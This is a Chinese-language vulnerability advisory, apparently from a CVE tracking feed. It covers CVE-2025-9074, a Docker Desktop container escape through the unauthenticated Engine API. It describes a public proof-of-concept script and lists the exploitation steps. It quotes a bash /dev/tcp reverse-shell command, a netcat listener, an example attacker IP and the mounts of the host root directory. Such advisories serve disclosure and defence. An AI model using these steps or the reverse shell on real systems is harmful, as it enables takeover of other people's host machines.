## CVE-2025-9074 - Docker Desktop 容器逃逸/权限提升/未授权API访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/权限提升/未授权API访问

**影响应用:** Docker Desktop

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop for Windows和macOS版本 < 4.44.3

**利用条件:** 攻击者需在本地运行恶意Linux容器，并通过默认子网(192.168.65.7:2375)访问未认证的Docker Engine API。漏洞不依赖挂载。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 0%

## 详情

CVE-2025-9074是Docker Desktop中的一个严重漏洞，允许本地运行的恶意Linux容器绕过隔离机制，通过默认子网（通常是192.168.65.7:2375）直接访问Docker Engine API。由于Docker Engine API在该情境下未进行身份验证，攻击者可以滥用此API来创建和启动具有特权的新容器，从而实现容器逃逸并完全控制宿主机系统。

**POC有效性分析：**
提供的POC代码`CVE-2025-9074.sh`是一个功能完整的shell脚本，专门用于演示此漏洞的利用。该脚本的核心在于利用`curl`命令与未授权的Docker Engine API进行交互。它首先通过请求`/images/json`端点获取一个可用的Docker镜像名称。随后，脚本构造一个JSON负载，通过`/containers/create`端点创建一个新的容器。这个JSON负载的关键在于：
1. `Cmd`参数被设置为一个反向shell命令（`bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1`），指示新容器在启动时尝试连接回攻击者的监听器。
2. `HostConfig`中的`Binds`参数用于将宿主机的根目录（在Windows上为`/mnt/host/c:/host_root_win`，在macOS/Linux上为`/:/host_root_nix`）挂载到新创建的容器内部。这使得攻击者可以通过容器访问宿主机的文件系统。
最后，脚本通过`/containers/${ID}/start`端点启动新创建的容器。整个过程逻辑清晰，直接利用了Docker Engine API的未授权访问特性，成功实现了从容器内部到宿主机的权限提升和控制。该脚本的有效性非常高，能够重现漏洞并获得宿主机shell。

**利用步骤：**
1. 攻击者首先需要具备在受影响的Docker Desktop环境中运行一个恶意Linux容器的权限。这可以是任何能够执行shell脚本的容器。
2. 攻击者在其控制的机器上设置一个监听器，例如使用Netcat：`nc -lvp 9002`，等待反向shell连接。
3. 在恶意容器内部或从能够访问容器网络的宿主机/虚拟机上执行POC脚本。执行时需要提供Docker Engine API的IP地址和端口（默认为192.168.65.7和2375），以及攻击者监听器的IP地址和端口。例如：`sh CVE-2025-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
4. POC脚本会利用未授权的Docker Engine API创建一个新容器，该容器被精心配置为执行反向shell命令，并将宿主机的根目录挂载到自身内部。
5. 新创建的容器启动后，将立即尝试连接回攻击者预设的监听器。一旦连接成功，攻击者将获得一个指向宿主机的shell，从而实现对宿主机系统的完全控制。

**投毒风险分析：**
该POC代码是一个简洁明了的shell脚本，其内容完全透明，无任何混淆。脚本主要依赖标准工具如`curl`和`bash`进行操作，所有的命令和参数都清晰可见。脚本的目的是通过Docker Engine API创建一个反向shell并挂载宿主机目录，这是漏洞利用的预期行为，而非恶意投毒。脚本中没有发现下载外部可执行文件、执行非预期系统命令、进行数据窃取或传输到第三方服务器等与漏洞利用无关的恶意行为。其所有网络请求都集中在Docker Engine API以及最终的反向shell连接上，这些都是可验证且与漏洞利用直接相关的。因此，该POC代码的投毒风险评估为极低，几乎为0%。用户在执行前，只需简单审查脚本内容，确认其参数设置正确，即可安全地用于漏洞复现和防御测试。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
